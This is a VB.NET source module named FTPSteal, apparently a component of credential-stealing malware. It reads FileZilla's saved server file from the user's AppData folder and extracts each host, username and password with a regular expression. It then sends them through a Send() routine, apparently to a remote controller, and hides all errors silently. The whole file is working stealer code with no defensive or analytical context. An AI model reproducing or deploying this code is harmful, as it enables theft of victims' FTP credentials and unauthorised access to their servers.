Imports System.Text
Imports System.Text.RegularExpressions

Module FTPSteal
    Public Function ftpstealer(ByVal expression As String, ByVal source As String)
        Try
            Dim output As New StringBuilder
            Dim myregex As New System.Text.RegularExpressions.Regex(expression)
            Dim mymatches As MatchCollection = myregex.Matches(source)
            Dim ie As IEnumerator
            ie = mymatches.GetEnumerator
            While ie.MoveNext
                Dim current As Match = DirectCast(ie.Current, Match)
                Dim objects As GroupCollection = current.Groups
                Threading.Thread.Sleep(1000)
                Send("PASS*" & objects(1).Value & "*" & objects(2).Value & "*" & objects(3).Value & "*")
            End While
            Return output.ToString
        Catch
            Return String.Empty
        End Try
    End Function
    Public Sub ftpsteal()
        Try
            Dim file As String
            Dim credentials As String
            Dim Reader As New IO.StreamReader(Environ("AppData") & "\FileZilla\recentservers.xml")
            file = Reader.ReadToEnd()
            Reader.Close()
            credentials = ftpstealer("<Host>(.+?)</Host>\s+.+\s+.+\s+.+\s+<User>(.+?)</User>\s+<Pass>(.+?)</Pass>", file)
        Catch
        End Try
    End Sub
End Module
